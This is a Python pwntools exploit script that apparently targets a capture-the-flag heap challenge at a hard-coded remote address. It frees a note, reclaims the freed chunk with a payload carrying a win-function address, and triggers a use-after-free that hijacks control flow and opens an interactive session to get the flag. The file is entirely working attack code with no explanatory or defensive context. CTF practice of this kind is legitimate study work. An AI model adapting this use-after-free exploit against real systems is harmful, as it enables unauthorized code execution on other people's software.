from pwn import *
WIN_ADDRESS = 0x4014ed 
HOST = '167.71.230.36'
PORT = 1337
context.arch = 'amd64'
context.log_level = 'debug'  
def start():
    return remote(HOST, PORT)

def add_note(r, index, size, content):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Index:', str(index).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendlineafter(b': ', content)

def delete_note(r, index):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Index:', str(index).encode())

def print_note(r, index):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'Index:', str(index).encode())

def alloc_string(r, size, content):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendlineafter(b': ', content)
def main():
    log.info(f"target at {HOST}:{PORT}")
    r = start()
    log.info("allocating")
    add_note(r, 0, 32, b"yaaayyyy")
    log.info("deleting")
    delete_note(r, 0)
    log.info("PWN")
    payload = p64(WIN_ADDRESS) + p64(0)
    alloc_string(r, 16, payload)
    log.info("exploit")
    print_note(r, 0)
    print("flag")
    r.interactive()

if __name__ == "__main__":
    main()